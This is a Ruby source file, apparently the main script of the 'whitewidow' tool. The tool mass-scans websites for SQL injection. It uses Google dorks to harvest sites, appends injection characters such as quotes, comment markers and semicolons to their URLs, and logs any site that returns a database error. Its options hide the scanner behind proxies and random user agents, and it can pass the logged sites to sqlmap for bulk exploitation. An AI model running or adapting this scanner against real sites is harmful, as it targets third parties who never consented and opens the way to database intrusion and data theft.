#!/usr/local/env ruby

require_relative 'lib/imports/constants_and_requires'

#
# Usage page, basic help page for commands
#
def usage_page
  FORMAT.info("ruby #{File.basename(__FILE__)} -[SHORT-OPTS] [ARGS] --[LONG-OPTS] [ARGS]")
  FORMAT.info("Check the README.md file for a list of flags and further information\n")
  system('ruby whitewidow.rb --help')
  exit
end

#
# Append into the OPTIONS constant so that we can call the flag from the constant instead of a class
#
OptionParser.new do |opt|
  opt.banner="Mandatory options  : -[d|f|s] FILE|URL --[default|file|spider] FILE|URL
Enumeration options: -[x] NUM --[dry-run|batch|run-x] NUM
Anomity options    : -[p] IP:PORT --[rand-agent|proxy] IP:PORT
Processing options : -[D] DORK --[sqlmap|dork] DORK
Misc options       : -[l|b] --[legal|banner|beep]

" # Blank line has to be there so that the help menu looks good.
  opt.on('-f FILE', '--file FILE', 'Pass a filename to scan for vulnerabilities')         { |o| OPTIONS[:file]    = o }
  opt.on('-s URL', '--spider URL', 'Spider a web page and save all the URLS')             { |o| OPTIONS[:spider]  = o }
  opt.on('-d', '--default', 'Run in default mode, scrape Google')                         { |o| OPTIONS[:default] = o }
  opt.on('-l', '--legal', 'Show the legal information and the TOS')                       { |o| OPTIONS[:legal]   = o }
  opt.on('-p IP:PORT', '--proxy IP:PORT', 'Configure to run with a proxy, must use ":"')  { |o| OPTIONS[:proxy]   = o }
  opt.on('-x NUM', '--run-x NUM', 'Run the specified amount of dry runs')                 { |o| OPTIONS[:run]     = o }
  opt.on('-b', '--banner', 'Hide the banner')                                             { |o| OPTIONS[:banner]  = o }
  opt.on('-D DORK', '--dork DORK', 'Use your own dork to do the searching')               { |o| OPTIONS[:dork]    = o } # Issue #32 https://github.com/Ekultek/whitewidow/issues/32
  opt.on('-v', '--version', 'Display the version number and exit')                        { |o| OPTIONS[:version] = o }
  opt.on('--dry-run', 'Run a dry run (no checking for vulnerability with prompt)')        { |o| OPTIONS[:dry]     = o }
  opt.on('--batch', 'No prompts, used in conjunction with the dry run')                   { |o| OPTIONS[:batch]   = o }
  opt.on('--beep', 'Make a beep when the program finds a vulnerability')                  { |o| OPTIONS[:beep]    = o }
  opt.on('--rand-agent', 'Use a random user agent')                                       { |o| OPTIONS[:agent]   = o }
  opt.on('--sqlmap', 'Run sqlmap through the SQL_VULN.LOG file as a bulk file')           { |o| OPTIONS[:sqlmap]  = o }
end.parse!

#
# File formatting
#
def format_file
  FORMAT.info('Writing to temporary file..')
  if File.exists?(OPTIONS[:file])
    file = Tempfile.new('file') # Write to a temp file
    IO.read(OPTIONS[:file]).each_line do |line|
      File.open(file, 'a+') { |format| format.puts(line) unless line.chomp.empty? } # Skip blank lines and whitespace
    end
    IO.read(file).each_line do |to_file|
      File.open("#{PATH}/tmp/#sites.txt", 'a+') { |line| line.puts(to_file) }
    end
    file.unlink
    FORMAT.info("File: #{OPTIONS[:file]}, has been formatted and saved as #sites.txt in the tmp directory.")
  else
    puts <<~_END_

      Hey now my friend, I know you're eager, I am also, but that file #{OPTIONS[:file]}
      either doesn't exist, or it's not in the directory you say it's in..

      I'm gonna need you to go find that file, move it to the correct directory and then
      run me again.

      Don't worry I'll wait!
         _END_
             .yellow.bold  # Error out because the file doesn't exist
  end
end

#
# Get the URLS by connecting to google and scraping for the URLS on the first page
#
def get_urls
  query = SETTINGS.extract_query!

  File.read("#{QUERY_BLACKLIST_PATH}").each_line do |black|  # check if the search query is black listed
    if query == black
      FORMAT.warning("Query: #{query} is blacklisted, defaulting to random query")
      query = File.readlines("#{PATH}/lib/lists/search_query.txt").sample  # Retry if it is
    end
  end

  FORMAT.info("I'm searching for possible SQL vulnerable sites, using search query #{query.chomp}")
  agent = Mechanize.new
  if OPTIONS[:proxy]
    agent.set_proxy(OPTIONS[:proxy].split(":").first, OPTIONS[:proxy].split(":").last)  # Set your proxy if used
  end
  correct_agent = SETTINGS.random_agent?
  agent.user_agent = correct_agent
  correct_agent == DEFAULT_USER_AGENT ? FORMAT.info("Using default user agent") :
      FORMAT.info("Grabbed random agent: #{correct_agent}")
  page = agent.get("http://google.com")
  google_form = page.form('f')
  google_form.q = "#{query}"  # Search Google for the query
  url = agent.submit(google_form, google_form.buttons.first)
  url.links.each do |link|
    if link.href.to_s =~ /url.q/  # Pull the links from the search
      str = link.href.to_s
      str_list = str.split(%r{=|&})
      urls = str_list[1]
      if urls.split("/")[2].start_with?(*SKIP)  # Skip all the bad URLs
        next
      end
      urls_to_log = URI.decode(urls)
      FORMAT.success("Site found: #{urls_to_log}")
      sleep(0.3)
      %w(' -- ; " /* '/* '-- "-- '; "; `).each { |sql|
        File.open("#{SITES_TO_CHECK_PATH}", 'a+') { |to_check| to_check.puts("#{urls_to_log}#{sql}") } # Add sql syntax to all "="
        MULTIPARAMS.check_for_multiple_parameters(urls_to_log, sql)
      }
    end
  end
  FORMAT.info("I've dumped possible vulnerable sites into #{SITES_TO_CHECK_PATH}")
end

#
# Check the sites that where found for vulnerabilities by checking if they throw a certain error
#
def vulnerability_check
  OPTIONS[:default] ? file_to_read = SITES_TO_CHECK_PATH : file_to_read = FILE_FLAG_FILE_PATH
  FORMAT.info('Forcing encoding to UTF-8') unless OPTIONS[:file]
  IO.read("#{file_to_read}").each_line do |vuln|
    begin
      FORMAT.info("Parsing page for SQL syntax error: #{vuln.chomp}")
      Timeout::timeout(10) do
        vulns = vuln.encode(Encoding.find('UTF-8'), {invalid: :replace, undef: :replace, replace: ''}) # Force encoding to UTF-8
        begin
          if SETTINGS.parse("#{vulns.chomp}'", 'html', 0) =~ SQL_VULN_REGEX  # If it has the vuln regex error
            FORMAT.site_found(vulns.chomp)
            File.open("#{TEMP_VULN_LOG}", "a+") { |vulnerable| vulnerable.puts(vulns) }
            sleep(0.5)
          else
            FORMAT.warning("URL: #{vulns.chomp} is not vulnerable, dumped to non_exploitable.txt")
            File.open("#{NON_EXPLOITABLE_PATH}", "a+") { |non_exploit| non_exploit.puts(vulns) }
            sleep(0.5)
          end
        rescue Timeout::Error, OpenSSL::SSL::SSLError  # Timeout or SSL errors
          FORMAT.warning("URL: #{vulns.chomp} failed to load dumped to non_exploitable.txt")
          File.open("#{NON_EXPLOITABLE_PATH}", "a+") { |timeout| timeout.puts(vulns) }
          sleep(0.5)
          next
        end
      end
    rescue *LOADING_ERRORS
      FORMAT.err("URL: #{vuln.chomp} failed due to an error while connecting, URL dumped to non_exploitable.txt")
      File.open("#{NON_EXPLOITABLE_PATH}", "a+") { |error| error.puts(vuln) }
      next
    end
  end
end

#
# This case statement has to be empty or the program won't read the options constants
begin
case
  when OPTIONS[:default]
    begin
      SETTINGS.hide_banner?
      SETTINGS.show_legal?
      get_urls
      if File.size("#{SITES_TO_CHECK_PATH}") == 0
        FORMAT.warning("No sites found for search query: #{SEARCH_QUERY}. Adding query to blacklist so it won't be run again.")  # Add the query to the blacklist
        File.open("#{QUERY_BLACKLIST_PATH}", "a+") { |query| query.puts(SEARCH_QUERY) }
        FORMAT.info("Query added to blacklist and will not be run again, exiting..")
        exit(1)
      elsif OPTIONS[:dry]
        dry = FORMAT.prompt('Run the sites[Y/N]') unless OPTIONS[:batch]
        dry = 'N' if OPTIONS[:batch]
        if dry.upcase == 'N'
          FORMAT.info('Sites saved to file, will not run scan now..')
          exit(0)
        else
          vulnerability_check
        end
      else
        vulnerability_check
      end
      File.open("#{ERROR_LOG_PATH}", 'a+') {
          |s| s.puts("No sites found with search query #{DEFAULT_SEARCH_QUERY}")
      } if File.size("#{SITES_TO_CHECK_PATH}") == 0
      File.truncate("#{SITES_TO_CHECK_PATH}", 0)
      FORMAT.info("I'm truncating SQL_sites_to_check file back to #{File.size("#{SITES_TO_CHECK_PATH}")}")
      Copy.file("#{TEMP_VULN_LOG}", "#{SQL_VULN_SITES_LOG}")
      File.truncate("#{TEMP_VULN_LOG}", 0)
      FORMAT.info("I've run all my tests and queries, and logged all important information into #{SQL_VULN_SITES_LOG}")
    rescue *FATAL_ERRORS => e
      d = DateTime.now
      FORMAT.fatal("I've experienced an error and won't continue.. It's gonna break something if I keep trying.. Error: #{e}")
      File.open("#{ERROR_LOG_PATH}", 'a+') {
          |error| error.puts("[#{d.month}-#{d.day}-#{d.year}::#{Time.now.strftime("%T")}] Error: #{e.backtrace_locations}")
      }
      FORMAT.info("I'll log the error inside of #{ERROR_LOG_PATH} for further analysis.")
      FORMAT.info("Create an issue for the error and label it as 'Fatal error #{e} #{File.readlines(ERROR_LOG_PATH).size}'")
    end
  when OPTIONS[:file]
    begin
      SETTINGS.hide_banner?
      SETTINGS.show_legal?
      FORMAT.info('Formatting file')
      format_file
      vulnerability_check
      File.truncate("#{SITES_TO_CHECK_PATH}", 0)
      FORMAT.info("I'm truncating SQL_sites_to_check file back to #{File.size("#{SITES_TO_CHECK_PATH}")}")
      Copy.file("#{TEMP_VULN_LOG}", "#{SQL_VULN_SITES_LOG}")
      File.truncate("#{TEMP_VULN_LOG}", 0)
      FORMAT.info(
          "I've run all my tests and queries, and logged all important information into #{SQL_VULN_SITES_LOG}"
      ) unless File.size("#{SQL_VULN_SITES_LOG}") == 0
    rescue *FATAL_ERRORS => e
      d = DateTime.now
      FORMAT.fatal("I've experienced an error and won't continue.. It's gonna break something if I keep trying.. Error: #{e}")
      File.open("#{ERROR_LOG_PATH}", 'a+') {
          |error| error.puts("[#{d.month}-#{d.day}-#{d.year}::#{Time.now.strftime("%T")}] Error: #{e.backtrace_locations}")
      }
      FORMAT.info("I'll log the error inside of #{ERROR_LOG_PATH} for further analysis.")
      FORMAT.info("Create an issue for the error and label it as 'Fatal error #{e} #{File.readlines(ERROR_LOG_PATH).size}'")
    end
  when OPTIONS[:legal]
    SETTINGS.show_legal?
  when OPTIONS[:run]
    OPTIONS[:run].to_i.times do
      system('ruby whitewidow.rb -d --dry-run --batch --banner')
    end
    FORMAT.info("#{OPTIONS[:run]} runs completed successfully.")
  when OPTIONS[:sqlmap]
    commands = SETTINGS.sqlmap_config
    FORMAT.info("Launching sqlmap..")
    system("python #{SQLMAP_PATH} -m #{SQL_VULN_SITES_LOG} #{commands}")
  when OPTIONS[:spider]
    begin
      arr = SPIDER_BOT.pull_links(OPTIONS[:spider])
      SPIDER_BOT.follow_links(arr)
      FORMAT.info("Found a total of #{File.open(BLACKWIDOW_LOG).readlines.size} links. Running them as file..")
      system("ruby whitewidow.rb --banner -f #{BLACKWIDOW_LOG}")
      File.truncate("tmp/blackwidow_log.txt", 0)
    rescue *SPIDER_ERRORS
      FORMAT.err("#{OPTIONS[:spider]} encountered an error and cannot continue. Running site obtained so far")
      system("ruby whitewidow.rb --banner -f #{BLACKWIDOW_LOG}")
    end
  when OPTIONS[:version]
    FORMAT.info("Currently version: #{VERSION}")
    exit
  else
    FORMAT.warning('You failed to pass me a flag!')
    usage_page
end
rescue => e
  FORMAT.err("Failed with error code #{e}")
  if e.inspect =~ /OpenSSL::SSL::SSLError/
    FORMAT.warning("Your user agent is bad, make an issue with the user agent")
    FORMAT.info("Running as default..")  # Temp fix until I can fix the user agents.
    system("ruby whitewidow.rb -d --banner")
  end
end
